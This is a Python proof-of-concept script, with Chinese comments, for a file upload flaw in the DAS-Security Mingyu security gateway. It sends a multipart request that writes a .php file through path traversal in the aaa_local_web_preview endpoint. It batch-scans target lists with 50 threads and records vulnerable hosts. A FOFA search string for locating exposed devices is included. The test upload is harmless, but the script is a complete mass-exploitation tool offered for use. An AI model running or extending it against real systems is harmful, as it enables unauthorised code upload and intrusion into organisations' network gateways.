# 安恒明御安全网关aaa_local_web_preview文件上传漏洞
import argparse,requests,sys,time,re
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# fofa语句
# title="明御安全网关"

def banner():
    test = """
 █████╗ ██╗  ██╗███╗   ███╗██╗   ██╗     ██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗ 
██╔══██╗██║  ██║████╗ ████║╚██╗ ██╔╝     ██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗
███████║███████║██╔████╔██║ ╚████╔╝█████╗██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║
██╔══██║██╔══██║██║╚██╔╝██║  ╚██╔╝ ╚════╝██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║
██║  ██║██║  ██║██║ ╚═╝ ██║   ██║        ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝         ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                                                                                           
                                                    author:果冻
"""
    colored_color = colored(test, 'blue')
    print(colored_color)



def main():
    banner()
    parser = argparse.ArgumentParser(description='安恒明御安全网关aaa_local_web_preview文件上传漏洞POC')
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入你要测试的URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




def poc(target):
    api_payload = "/webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../jfhatuwe.php"
    headers = {
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_14_3)AppleWebKit/605.1.15(KHTML,likeGecko)Version/12.0.3Safari/605.1.15',
        'Connection':'close',
        'Content-Length':'198',
        'Accept-Encoding':'gzip',
        'Content-Type':'multipart/form-data;boundary=qqobiandqgawlxodfiisporjwravxtvd'
    }
    data = '--qqobiandqgawlxodfiisporjwravxtvd\r\nContent-Disposition: form-data; name="123"; filename="9B9Ccd.php"\r\nContent-Type: text/plain\r\n\r\n123\r\n--qqobiandqgawlxodfiisporjwravxtvd--'

    try:
        response = requests.post(url=target+api_payload,headers=headers,data=data,verify=False,timeout=10)
        path = "/jfhatuwe.php"
        if response.status_code == 200 and "success" in response.text:
            print(f"[+]{target} 存在文件上传漏洞，文件上传的路径为：{target}{path}")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} 不存在文件上传漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")


if __name__ == '__main__':
    main()